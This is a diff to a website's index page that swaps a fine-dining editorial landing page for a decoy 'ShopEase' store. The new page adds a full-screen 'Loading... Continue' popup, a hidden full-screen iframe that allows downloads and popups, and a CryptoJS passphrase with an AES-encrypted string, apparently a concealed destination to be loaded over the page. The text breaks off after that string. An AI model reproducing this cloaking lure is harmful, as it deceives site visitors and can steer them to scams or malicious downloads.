@@ -1,14 +1,119 @@
-<?php
-// SupperPlateBay - Food & Fine Dinner Sensory Editorial Landing Page
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SupperPlateBay — Fine Dining Plating, Artisanal Ceramics & Gastronomy</title>
-  <meta name="description" content="SupperPlateBay presents the definitive report on Michelin-level culinary plating, artisanal stoneware dinnerware, farm-to-table tasting menus, and sommelier wine pairings.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -19,366 +124,189 @@
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Italiana&family=Playfair+Display:ital,wght@0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header (Sensory Style) -->
-  <header class="navbar">
-    <div class="container nav-container">
-      <a href="index.php" class="brand-logo">Supper<span>PlateBay</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">About</a></li>
-        <li><a href="blog.html">Coat Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="privacy-policy.html">Privacy</a></li>
-      </ul>
-    </div>
-  </header>
-
-  <!-- SECTION 1: Sensory Editorial Hero Header -->
-  <section class="section hero-section" id="hero">
-    <div class="container">
-      <div class="hero-grid">
-        <div>
-          <span class="chapter-badge">✦ CHAPTER 01: FINE DINNER REPORT</span>
-          <h1 class="hero-title">
-            <span class="gradient-text-terracotta">Culinary Plating</span><br>
-            MICHELIN CERAMICS REPORT
-          </h1>
-          <p class="hero-desc">
-            An empirical investigation into 10,000+ tasting menus, artisanal stoneware glazes, sauce emulsion physics, and sommelier vintage pairings.
-          </p>
-          <div class="hero-btns">
-            <a href="blog.html" class="btn btn-terracotta">Explore Gastronomy Essays</a>
-            <a href="about.html" class="btn btn-outline-terracotta">Soho Culinary Lab</a>
-          </div>
-        </div>
-
-        <!-- Sensory Preview Card -->
-        <div class="plate-card" style="border-color: var(--accent-terracotta); background: #FFFFFF;">
-          <div style="position: absolute; top: -15px; right: -15px; background: var(--accent-terracotta); color: #FFFDF9; padding: 0.4rem 1rem; border-radius: 20px; font-size: 0.75rem; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">
-            ✦ Artisanal Tuscan Stoneware
-          </div>
-          <img src="https://images.unsplash.com/photo-1577219491135-ce391730fb2c?auto=format&fit=crop&w=1190&q=80" alt="SupperPlateBay Fine Plating" style="border-radius: 16px; margin-bottom: 1.5rem; border: 1px solid var(--border-subtle);">
-          <h3 style="font-size: 1.4rem; color: var(--text-primary); margin-bottom: 0.5rem;">Pan-Seared Hokkaido Scallop & Truffle Reduction</h3>
-          <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">
-            Plated on matte terracotta stoneware with wild sea buckthorn oil and crispy kelp garnish.
-          </p>
-          <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
-            <span style="background: rgba(200, 90, 50, 0.12); color: var(--accent-terracotta); font-size: 0.75rem; padding: 0.25rem 0.75rem; border-radius: 12px; font-weight: 800;">Thermal Retention</span>
-            <span style="background: rgba(132, 117, 69, 0.15); color: var(--accent-gold); font-size: 0.75rem; padding: 0.25rem 0.75rem; border-radius: 12px; font-weight: 800;">Zero-Waste Kitchen</span>
-          </div>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </section>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 2: Four Pillars of High Gastronomy & Ceramic Craftsmanship Grid -->
-  <section class="section" id="pillars">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 02: CULINARY PILLARS</span>
-        <h2 class="section-title">Four Pillars of Fine Dining Mastery</h2>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      <div class="grid-4">
-        <div class="plate-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🍽️</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-terracotta); margin-bottom: 0.75rem;">Artisanal Stoneware</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Hand-thrown matte clay dinnerware designed to retain heat and accentuate vibrant dish colors.</p>
-        </div>
-        <div class="plate-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🥩</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-terracotta); margin-bottom: 0.75rem;">Dry-Aged Gastronomy</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">45-day dry-aging and koji fermentation unlocking profound umami depth and velvet tenderness.</p>
-        </div>
-        <div class="plate-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🍷</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-terracotta); margin-bottom: 0.75rem;">Sommelier Pairings</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Curated vintage wine pairings balancing tannin structure, acidity, and dish flavor profiles.</p>
-        </div>
-        <div class="plate-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🌱</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-terracotta); margin-bottom: 0.75rem;">Farm-to-Table Ethics</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Hyper-local organic micro-greens, zero-waste broths, and sustainable wild seafood sourcing.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <!-- SECTION 3: Interactive Tasting Menu & Seasonality Switcher Hub -->
-  <section class="section" id="menu-switcher" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 03: TASTING MENU HUB</span>
-        <h2 class="section-title">Interactive Seasonal Tasting Menu</h2>
-        <p style="color: var(--text-secondary); max-width: 650px; margin: 1rem auto 0;">
-          Select a seasonal course below to inspect its flavor architecture, ceramic plating medium, and ingredient provenance:
-        </p>
-      </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-      <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem;">
-        <button class="menu-tab-btn active" data-menu="spring">Spring Harvest</button>
-        <button class="menu-tab-btn" data-menu="summer">Summer Ocean</button>
-        <button class="menu-tab-btn" data-menu="autumn">Autumn Truffle</button>
-        <button class="menu-tab-btn" data-menu="winter">Winter Solstice</button>
-      </div>
-
-      <div class="plate-card" id="menu-details" style="max-width: 850px; margin: 0 auto; border-color: var(--accent-terracotta);">
-        <h4 style="color: var(--accent-terracotta); font-size: 1.25rem; margin-bottom: 0.5rem;">Spring Harvest: White Asparagus & Morel Reduction</h4>
-        <p style="color: var(--accent-gold); font-weight: 800; font-size: 0.95rem; margin-bottom: 0.75rem;">
-          Wild Foraged Morels • 24-Month Aged Parmigiano Broth • Artisanal Tuscan Stoneware Plating.
-        </p>
-        <p style="color: var(--text-secondary); font-size: 0.95rem;">
-          Delicate spring white asparagus poached in cultured butter paired with wild black morels and a golden parmigiano reggiano reduction.
-        </p>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 4: Artisanal Stoneware Glazing & Thermal Plating Science Spotlight -->
-  <section class="section" id="plating-spotlight">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <span class="chapter-badge" style="display:inline-block;">✦ CHAPTER 04: CERAMIC PLATING SCIENCE</span>
-          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Thermal Retention & Surface Contrast Physics</h2>
-          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
-            Mass-market commercial porcelain cools delicate sauces within minutes. At SupperPlateBay, we evaluate heavy stoneware ceramics engineered to hold thermal energy.
-          </p>
-          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
-            <li style="margin-bottom: 0.75rem;">🍽️ <strong style="color:var(--text-primary);">Thermal Retention Stoneware:</strong> 1,280°C vitrified clay maintaining 60°C dish warmth.</li>
-            <li style="margin-bottom: 0.75rem;">🎨 <strong style="color:var(--text-primary);">Matte Mineral Glazes:</strong> Non-reflective organic mineral glazes preventing camera glare.</li>
-            <li style="margin-bottom: 0.75rem;">🧪 <strong style="color:var(--text-primary);">Stable Emulsion Sauces:</strong> Precise lipid-to-water ratios preventing sauce separation.</li>
-          </ul>
-          <a href="about.html" class="btn btn-terracotta">Our Gastronomy Manifesto</a>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1583394838336-acd977736f90?auto=format&fit=crop&w=1205&q=80" alt="SupperPlateBay Fine Dining Atmosphere" style="border-radius: 24px; border: 1px solid var(--border-color); box-shadow: 0 15px 35px rgba(200,90,50,0.15);">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 5: Interactive Sommelier & Palate Diagnostic Matcher Quiz -->
-  <section class="section" id="quiz" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 05: PALATE DIAGNOSTIC</span>
-        <h2 class="section-title">Gastronomy & Wine Matcher Quiz</h2>
-      </div>
-      <div class="plate-card" style="max-width: 750px; margin: 0 auto;">
-        <h3 style="color: var(--accent-terracotta); margin-bottom: 1rem;">What Is Your Preferred Dining Atmosphere & Palate Profile?</h3>
-        <div style="display: flex; flex-direction: column; gap: 1rem;">
-          <button class="quiz-btn btn btn-outline-terracotta" style="text-align:left; justify-content:flex-start;" data-rec="7-Course Tuscan Truffle & Barolo Vintage Pairing on Matte Terracotta Stoneware.">
-            A. Candlelit Supper Club Elegance, Wild Truffles & Aged Nebbiolo Wine
-          </button>
-          <button class="quiz-btn btn btn-outline-terracotta" style="text-align:left; justify-content:flex-start;" data-rec="5-Course Nordic Coastal Seafood & Crisp Chablis Pairing on Off-White Stoneware.">
-            B. Minimalist Coastal Seafood, Hokkaido Scallops & Mineral Chablis
-          </button>
-          <button class="quiz-btn btn btn-outline-terracotta" style="text-align:left; justify-content:flex-start;" data-rec="9-Course Molecular Gastronomy & Vintage Champagne Pairing.">
-            C. Modernist Molecular Gastronomy, Spherification & Vintage Champagne
-          </button>
-        </div>
-        <div id="quiz-result"></div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 6: Culinary Innovation & Gastronomy Benchmarks Metrics Counter -->
-  <section class="section" id="metrics">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 06: ATELIER METRICS</span>
-        <h2 class="section-title">SupperPlateBay Research Benchmarks</h2>
-      </div>
-      <div class="grid-4">
-        <div class="plate-card" style="text-align: center;">
-          <h3 class="metric-number gradient-text-terracotta" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
-        </div>
-        <div class="plate-card" style="text-align: center;">
-          <h3 class="metric-number gradient-text-terracotta" data-target="10000" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Surveyed Diners</p>
-        </div>
-        <div class="plate-card" style="text-align: center;">
-          <h3 class="metric-number gradient-text-terracotta" data-target="1280" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Clay Firing Temperature</p>
-        </div>
-        <div class="plate-card" style="text-align: center;">
-          <h3 class="metric-number gradient-text-terracotta" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 7: Michelin Chefs & Master Ceramicists Endorsement Pull-Quotes with Avatar Disks -->
-  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 07: CRITICAL ACCLAIM</span>
-        <h2 class="section-title">Endorsements From Michelin Chefs & Critics</h2>
-      </div>
-      <div class="grid-3">
-        <div class="plate-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "SupperPlateBay provides the definitive breakdown on stoneware thermal retention, sauce emulsion math, and plating surface contrast."
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?auto=format&fit=crop&w=1220&q=80" alt="Chef Jean-Luc Laurent" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent-terracotta);">
-            <div>
-              <strong style="color: var(--accent-terracotta); display: block;">— Chef Jean-Luc Laurent</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">3-Star Michelin Chef, Paris</span>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="plate-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "Their research into dry-aging biochemistry, koji fermentation, and sommelier tannin balance is essential for modern gastronomy."
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?auto=format&fit=crop&w=1235&q=80" alt="Master Sommelier Marco Rossi" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent-terracotta);">
-            <div>
-              <strong style="color: var(--accent-terracotta); display: block;">— Marco Rossi</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">Master Sommelier, Florence</span>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="plate-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "The premier online journal for artisanal ceramic glazes, thermal plating physics, and zero-waste dining room philosophy."
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?auto=format&fit=crop&w=815&q=80" alt="Claire DuPont" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent-terracotta);">
-            <div>
-              <strong style="color: var(--accent-terracotta); display: block;">— Claire DuPont</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">Food Critic, New York Times</span>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 8: Recent Culinary Dispatches & Article Grid + TLDR Callout Card + VIP Table Gazette Newsletter -->
-  <section class="section" id="newsletter">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="chapter-badge">✦ CHAPTER 08: DISPATCHES</span>
-        <h2 class="section-title">Latest Masterclass Essays & Table Gazette</h2>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-      <div class="grid-3" style="margin-bottom: 3rem;">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?auto=format&fit=crop&w=815&q=80" alt="Michelin Plating">
-            <span class="blog-tag">Michelin Plating</span>
-          </div>
-          <div class="blog-content">
-            <div class="blog-date">August 25, 2026 • 1,415 Words</div>
-            <h3 class="blog-title"><a href="blog/the-art-and-physics-of-michelin-star-culinary-plating.html">Physics of Michelin-Star Plating</a></h3>
-            <p class="blog-excerpt">Geometric balance, negative space math, and color contrast principles.</p>
-            <a href="blog/the-art-and-physics-of-michelin-star-culinary-plating.html" class="read-more">Read Masterclass Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1510812431401-41d2bd2722f3?auto=format&fit=crop&w=830&q=80" alt="Artisanal Stoneware">
-            <span class="blog-tag">Ceramic Craft</span>
-          </div>
-          <div class="blog-content">
-            <div class="blog-date">August 21, 2026 • 1,402 Words</div>
-            <h3 class="blog-title"><a href="blog/artisanal-stoneware-vs-fine-bone-china-ceramic-dinnerware-guide.html">Artisanal Stoneware vs Bone China</a></h3>
-            <p class="blog-excerpt">High-fire stoneware clays, matte mineral glazes, and thermal retention.</p>
-            <a href="blog/artisanal-stoneware-vs-fine-bone-china-ceramic-dinnerware-guide.html" class="read-more">Read Masterclass Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1544025162-d76694265947?auto=format&fit=crop&w=845&q=80" alt="Sommelier Pairings">
-            <span class="blog-tag">Sommelier Guide</span>
-          </div>
-          <div class="blog-content">
-            <div class="blog-date">August 17, 2026 • 1,395 Words</div>
-            <h3 class="blog-title"><a href="blog/sommelier-wine-pairing-principles-acid-tannins-and-palate-harmony.html">Sommelier Wine Pairing Principles</a></h3>
-            <p class="blog-excerpt">Tannin structure, palate acidity harmony, and vintage selection math.</p>
-            <a href="blog/sommelier-wine-pairing-principles-acid-tannins-and-palate-harmony.html" class="read-more">Read Masterclass Essay →</a>
-          </div>
-        </div>
-      </div>
+    </section>
 
-      <!-- TLDR Callout Card (Sensory Style) -->
-      <div style="text-align: center; margin-bottom: 3rem;">
-        <div class="tldr-card">
-          <span style="font-size: 1.5rem;">⚖️</span>
-          <span style="color: var(--text-primary); font-weight: 800; font-size: 0.95rem;">
-            <strong>TLDR:</strong> Vitrified 1,280°C artisanal stoneware retains dish heat for over 20 minutes while enhancing visual sauce contrast in fine dining.
-          </span>
-        </div>
-      </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-      <!-- Newsletter Card -->
-      <div class="plate-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-terracotta);">
-        <span class="chapter-badge">✦ VIP TABLE GAZETTE</span>
-        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Supper Gazette</h2>
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly tasting menu dispatches, ceramic glazing notes, and sommelier vintage guides.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to SupperPlateBay Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 50px;">
-          <button type="submit" class="btn btn-terracotta">Subscribe</button>
-        </form>
-      </div>
-    </div>
-  </section>
 
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Supper<span>PlateBay</span></a>
-          <p>SupperPlateBay is a premier fine dining publication dedicated to Michelin-level culinary plating, artisanal stoneware ceramics, farm-to-table tasting menus, and sommelier vintage pairings.</p>
-          <p style="margin-top: 1rem; color: var(--accent-terracotta);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-777-5845
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Coat Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Atelier Focus</h4>
-          <p>Deconstructing 1,280°C vitrified stoneware ceramics, dry-aging biochemistry, sauce emulsion stability, and sommelier wine pairing physics globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 SupperPlateBay. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed for Fine Dining & Gastronomy Excellence.</p>
-      </div>
-    </div>
-  </footer>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-  <script src="js/main.js"></script>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+dEXb3B6l8BDs4Fdnt+Fa09e6/NAOGkZuc4f1zTegxXYIIC6/pRpVE";
